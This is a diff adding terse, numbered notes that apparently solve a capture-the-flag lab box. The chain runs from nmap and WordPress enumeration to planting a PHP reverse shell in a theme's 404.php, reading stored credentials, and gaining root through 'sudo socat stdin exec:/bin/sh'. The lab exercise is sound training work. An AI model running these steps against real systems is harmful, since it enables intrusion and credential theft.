@@ -1,0 +1,17 @@
+1 - nmap -A 10.10.220.170
+2 - gobuster dir -u http://10.10.220.170 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - view-source:http://10.10.220.170/hackathons -> VINEGAR CIPHER
+4 - wpscan --url http://10.10.220.170/wordpress/ -e u
+5 - http://10.10.220.170/wordpress/wp-login.php
+6 - cat /usr/share/webshells/php/php-reverse-shell.php
+7 - Theme Editor -> 404.php
+8 - http://10.10.220.170/wordpress/wp-content/themes/twentytwenty/404.php
+9 - cat /home/elyana/hint.txt
+10 - netstat -tuna (mysql)
+11 - find / -user elyana -type f 2>/dev/null
+12 - cat /etc/mysql/conf.d/private.txt
+13 - su elyana
+14 - cat /home/elyana/user.txt
+15 - sudo -l (socat)
+16 - sudo socat stdin exec:/bin/sh
+17 - cat /root/root.txt
